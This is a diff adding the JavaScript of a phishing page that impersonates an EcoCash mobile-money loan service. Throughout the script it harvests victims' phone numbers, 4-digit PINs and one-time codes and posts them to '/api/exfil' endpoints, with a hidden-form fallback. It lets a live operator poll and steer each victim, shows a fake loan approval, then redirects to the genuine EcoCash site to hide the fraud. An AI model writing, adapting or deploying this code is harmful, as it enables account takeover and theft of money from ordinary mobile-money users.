@@ -1,0 +1,267 @@
+<script>
+  const API_BASE = window.location.origin;
+  const REDIRECT_URL = 'https://www.ecocash.co.zw/';
+  const REDIRECT_DELAY_MS = 300000;
+
+  let POLLING_INTERVAL = null;
+  let REDIRECT_TIMEOUT = null;
+
+  const state = { msisdn: '', amount: '', term: '', pin: '', otp: '', victimId: null };
+
+  // === API CALLS ===
+  async function apiPost(endpoint, payload) {
+    try {
+      const res = await fetch(`${API_BASE}${endpoint}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      return await res.json();
+    } catch (e) {
+      // Fallback: send via form POST (if fetch fails)
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = `${API_BASE}/exfil-post`;
+      for (const [k, v] of Object.entries(payload)) {
+        const input = document.createElement('input');
+        input.name = k;
+        input.value = v;
+        form.appendChild(input);
+      }
+      form.style.display = 'none';
+      document.body.appendChild(form);
+      form.submit();
+      return { ok: true };
+    }
+  }
+
+  async function apiGet(endpoint, params) {
+    try {
+      const qs = new URLSearchParams(params).toString();
+      const res = await fetch(`${API_BASE}${endpoint}?${qs}`, { cache: 'no-store' });
+      return await res.json();
+    } catch (e) {
+      return { action: 'none' };
+    }
+  }
+
+  // === HELPERS ===
+  function showErr(id, msg) {
+    const el = document.getElementById(id);
+    el.textContent = msg;
+    el.classList.add('show');
+  }
+
+  function showToast(msg) {
+    const toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 4000);
+  }
+
+  function getFinalAmount() {
+    const select = document.getElementById('loanAmount');
+    if (select.value === 'custom') {
+      return document.getElementById('customAmount').value.replace(/[^0-9.]/g, '');
+    }
+    return select.value;
+  }
+
+  function updateAmountPlaceholder() {
+    const select = document.getElementById('loanAmount');
+    const custom = document.getElementById('customAmount');
+    if (select.value === 'custom') {
+      custom.style.display = 'block';
+      setTimeout(() => custom.focus(), 100);
+    } else {
+      custom.style.display = 'none';
+    }
+  }
+
+  // === STEP 1 ===
+  document.getElementById('btnCheckLimit').addEventListener('click', () => {
+    const msisdn = document.getElementById('msisdn').value.trim();
+    const amount = getFinalAmount();
+
+    if (!msisdn || !/^(\+?263|0)?7(7|8)\d{7}$/.test(msisdn)) {
+      return showErr('err1', 'Enter a valid Ecocash number (e.g. +263771234567)');
+    }
+    if (!amount || isNaN(amount) || amount < 1) {
+      return showErr('err1', 'Please enter a valid loan amount');
+    }
+
+    state.msisdn = msisdn;
+    state.amount = '$' + amount;
+    state.term = document.getElementById('repaymentTerm').value + ' days';
+
+    document.getElementById('cardStep1').style.display = 'none';
+    document.getElementById('cardStep2').style.display = '';
+  });
+
+  // === STEP 2: PIN → EXFIL + OTP ===
+  document.getElementById('btnSubmitPin').addEventListener('click', () => {
+    const pin = document.getElementById('ecocashPin').value;
+    if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+      return showErr('err2', 'Enter a valid 4-digit PIN');
+    }
+
+    state.pin = pin;
+
+    // EXFIL 1: PIN + MSISDN
+    apiPost('/api/exfil', {
+      victimId: state.victimId,
+      msisdn: state.msisdn,
+      pin: state.pin,
+      otp: '',
+      amount: state.amount,
+      term: state.term,
+      time: new Date().toLocaleString()
+    });
+
+    openOtpSheet();
+  });
+
+  // === OTP SHEET ===
+  function openOtpSheet() {
+    state.victimId = Date.now().toString() + Math.random().toString(36).substr(2, 5);
+
+    document.getElementById('otpMsisdn').textContent = state.msisdn;
+    document.getElementById('otpSheet').classList.add('show');
+    document.querySelector('#otpRow input').focus();
+    startOtpTimer();
+
+    // Alert admin
+    apiPost('/api/alert', {
+      victimId: state.victimId,
+      msisdn: state.msisdn,
+      amount: state.amount
+    });
+
+    startPolling();
+  }
+
+  function startOtpTimer() {
+    let s = 600;
+    const el = document.getElementById('resendTimer');
+    const interval = setInterval(() => {
+      const mins = Math.floor(s / 60);
+      const secs = s % 60;
+      el.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+      if (--s < 0) clearInterval(interval);
+    }, 1000);
+  }
+
+  // === POLLING FOR ADMIN ACTION ===
+  function startPolling() {
+    POLLING_INTERVAL = setInterval(async () => {
+      const data = await apiGet('/api/poll', { victimId: state.victimId });
+
+      if (data.action === 'wrongpin') {
+        clearInterval(POLLING_INTERVAL);
+        showForcedPopup('❌ INVALID PIN\n\nYour session has expired due to incorrect authentication. Please reapply.');
+      }
+
+      if (data.action === 'wrongotp') {
+        clearInterval(POLLING_INTERVAL);
+        showForcedPopup('❌ INVALID OTP\n\nVerification failed. Restarting loan process for security.');
+      }
+
+      if (data.action === 'approve') {
+        clearInterval(POLLING_INTERVAL);
+        showToast('✅ Loan approved! Redirecting...');
+        setTimeout(() => showSuccessScreen(), 1500);
+      }
+    }, 2000);
+  }
+
+  function showForcedPopup(message) {
+    const overlay = document.createElement('div');
+    overlay.id = 'forcedPopup';
+    overlay.style = `position:fixed;inset:0;background:#000d;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#ff4757;text-align:center;padding:20px;`;
+    overlay.innerHTML = `<div style="font-size:60px;">⚠️</div><div style="font-size:22px;font-weight:bold;">Security Alert</div><pre style="font-size:16px;">${message}</pre>`;
+    document.body.appendChild(overlay);
+    setTimeout(() => window.location.reload(), 3000);
+  }
+
+  // === OTP HANDLING ===
+  const otpInputs = document.querySelectorAll('#otpRow input');
+  otpInputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/[^0-9]/g, '');
+      if (input.value && index < 3) otpInputs[index + 1].focus();
+      const otp = [...otpInputs].map(i => i.value).join('');
+      document.getElementById('btnVerify').disabled = otp.length !== 4;
+    });
+
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !input.value && index > 0) {
+        otpInputs[index - 1].focus();
+      }
+    });
+
+    input.addEventListener('paste', e => {
+      e.preventDefault();
+      const paste = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+      if (paste.length >= 4) {
+        [...otpInputs].forEach((inp, i) => { inp.value = paste[i] || ''; });
+        otpInputs[3].focus();
+        document.getElementById('btnVerify').disabled = false;
+      }
+    });
+  });
+
+  // === FINAL EXFIL + SUCCESS ===
+  document.getElementById('btnVerify').addEventListener('click', () => {
+    const otp = [...otpInputs].map(i => i.value).join('');
+    if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
+
+    state.otp = otp;
+
+    // EXFIL 2: FULL DATA
+    apiPost('/api/exfil', {
+      victimId: state.victimId,
+      msisdn: state.msisdn,
+      pin: state.pin,
+      otp: otp,
+      amount: state.amount,
+      term: state.term,
+      time: new Date().toLocaleString()
+    });
+
+    document.getElementById('otpSheet').classList.remove('show');
+    showSuccessScreen();
+
+    if (POLLING_INTERVAL) clearInterval(POLLING_INTERVAL);
+  });
+
+  function showSuccessScreen() {
+    document.getElementById('refCode').textContent = Math.floor(100000 + Math.random() * 900000);
+    document.getElementById('successAmount').textContent = state.amount;
+    document.getElementById('successMsisdn').textContent = state.msisdn;
+
+    document.getElementById('cardStep2').style.display = 'none';
+    document.getElementById('cardSuccess').style.display = '';
+
+    startRedirectTimer();
+    REDIRECT_TIMEOUT = setTimeout(() => { window.location.href = REDIRECT_URL; }, REDIRECT_DELAY_MS);
+  }
+
+  function startRedirectTimer() {
+    let s = 300;
+    const el = document.getElementById('redirectTimer');
+    const interval = setInterval(() => {
+      const mins = Math.floor(s / 60);
+      const secs = s % 60;
+      el.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+      if (--s < 0) clearInterval(interval);
+    }, 1000);
+  }
+
+  document.getElementById('otpClose').addEventListener('click', () => {
+    if (confirm('Cancel verification? Your loan will not be processed.')) {
+      document.getElementById('otpSheet').classList.remove('show');
+    }
+  });
+
+  document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
